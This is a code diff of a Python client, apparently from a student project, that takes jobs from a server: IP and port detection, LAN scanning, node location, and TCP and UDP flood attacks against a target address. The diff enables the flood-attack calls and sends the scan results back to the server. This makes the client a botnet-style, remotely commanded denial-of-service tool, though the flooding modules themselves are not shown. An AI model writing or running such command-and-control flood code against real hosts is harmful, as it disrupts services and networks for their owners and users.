@@ -4,12 +4,7 @@ from SpecificPortDetection import *
 from UDPFloodAttack import *
 from TCPFloodAttack import *
 from NodeLocation import *
-
-'''
-After Client runs Job Specific Program (EX: UDP Flood Attack)
-Send Message to Server to tell Job Creator the job is complete
-'''
-
+from NodeLANScan import *
 
 class Client(object):
 
@@ -39,6 +34,7 @@ class Client(object):
 
         #Final Project Job Objects
         self.nodeLocation = NodeLocation()
+        self.nodeLANScan = NodeLANScan()
 
         #Needed Variables
         self.in_data = ''
@@ -52,8 +48,6 @@ class Client(object):
 
         # Connecting Client--->Server
         self.client.connect((self.SERVER, self.PORT))
-
-        print(self.seekerIP)
 
     '''
     HELPER Functions
@@ -79,7 +73,7 @@ class Client(object):
             # For Setting the Target Credentials
             self.setTargetCredentials(self.in_data)
 
-            # For Running Specific Job
+            #For Running Specific Job
             self.jobPrograms()
 
             # Gathering Input From Client to send to Server
@@ -90,25 +84,37 @@ class Client(object):
 
     # Takes in Server Message to Run Specific Job
     def jobPrograms(self):
-        if self.in_data == "IPOnlineDetection":
+        if self.in_data == "IPDetection":
 
+            print("Getting IP")
             self.resetServerMessage()
             self.targetIP = self.in_data
 
+            print("Getting Port")
             self.resetServerMessage()
             self.targetPort = self.in_data
 
-            self.client.send(pickle.dumps(self.ipDetection.detectIPStatus(self.targetIP)))
+            print("Running Method")
+            self.ipDetection.detectIPStatus(self.targetIP)
 
-        elif self.in_data == "SpecificPortDetection":
+            print("Sending Info")
+            self.client.send(pickle.dumps(self.ipDetection.output))
 
+        elif self.in_data == "PortDetection":
+
+            print("Getting IP")
             self.resetServerMessage()
             self.targetIP = self.in_data
 
+            print("Getting Port")
             self.resetServerMessage()
             self.targetPort = int(self.in_data)
 
-            self.client.send(pickle.dumps(self.portDetection.checkPort(self.targetIP, self.targetPort)))
+            print("Running Method")
+            self.portDetection.checkPort(self.targetIP, self.targetPort)
+
+            print("Sending Info")
+            self.client.send(pickle.dumps(self.portDetection.output))
             
         elif self.in_data == "TCPFloodAttack":
 
@@ -118,27 +124,45 @@ class Client(object):
             self.resetServerMessage()
             self.targetPort = int(self.in_data)
 
-            self.client.send(pickle.dumps("Target IP: "+self.targetIP +" Target Port: "+ str(self.targetPort)+" TCP Flood Attack"))
+            self.client.send(pickle.dumps("Target IP: "+self.targetIP
+                                          +" Target Port: "+ str(self.targetPort)
+                                          +" TCP Flood Attack"))
+
+            self.tcpAttack.sendTCPPackets(self.targetIP, self.targetPort)
 
         elif self.in_data == "UDPFloodAttack":
 
+            print("Getting IP")
             self.resetServerMessage()
             self.targetIP = self.in_data
 
+            print("Getting Port")
             self.resetServerMessage()
             self.targetPort = int(self.in_data)
 
-            self.client.send(pickle.dumps("Target IP: "+self.targetIP +" Target Port: "+ str(self.targetPort)+" UDP Flood Attack"))
+            print("Sending Info")
+            self.client.send(pickle.dumps("Target IP: "+self.targetIP
+                                          +" Target Port: "+ str(self.targetPort)
+                                          +" UDP Flood Attack"))
+
+            print("Running Method")
+            self.udpAttack.sendUDPPackets(self.targetIP, self.targetPort)
 
         elif self.in_data == "NodeLocation":
 
+            print("Getting IP")
             self.resetServerMessage()
             self.targetIP = self.in_data
 
+            print("Getting Port")
             self.resetServerMessage()
             self.targetPort = int(self.in_data)
 
-            self.client.send(pickle.dumps(self.nodeLocation.DistanceEquation(self.targetIP)))
+            print("Running Method")
+            self.nodeLocation.DistanceEquation(self.targetIP)
+
+            print("Sending Info")
+            self.client.send(pickle.dumps(self.nodeLocation.output))
 
 
         elif self.in_data == "NodeLANScan":
@@ -149,7 +173,9 @@ class Client(object):
             self.resetServerMessage()
             self.targetPort = int(self.in_data)
 
-            #self.client.send(pickle.dumps(out_data))
+            self.nodeLANScan.LANScan(self.seekerIP)
+
+            self.client.send(pickle.dumps(self.nodeLANScan.hostList))
 
     #Prints List Messages From Server
     def obtainList(self, in_data):
@@ -197,7 +223,7 @@ class Client(object):
 
     # Refresh Buffer For New Server Message
     def resetServerMessage(self):
-        # Limiting to 1024 bytes
+        # Limiting to 2048 bytes
         self.in_data = self.client.recv(2048)
 
         # Sets in_data to what is sent from the Server
